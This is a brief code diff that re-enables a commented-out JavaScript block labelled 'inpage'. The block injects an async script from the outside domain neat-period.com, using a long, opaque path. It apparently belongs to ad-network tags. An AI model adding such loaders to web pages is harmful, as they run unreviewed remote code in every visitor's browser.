@@ -13,7 +13,7 @@ l.parentNode.insertBefore(s, l);
 })({});
 
 // inpage
-/* (function(jexr){
+(function(jexr){
 var d = document,
     s = d.createElement('script'),
     l = d.scripts[d.scripts.length - 1];
@@ -22,7 +22,7 @@ s.src = "\/\/neat-period.com\/bBX.V-sLdhGolN0vYoWRcf\/nevmX9JuqZcUql\/ktPsTeUg1R
 s.async = true;
 s.referrerPolicy = 'no-referrer-when-downgrade';
 l.parentNode.insertBefore(s, l);
-})({}); */
+})({});
 
 // push
 (function(oibv){
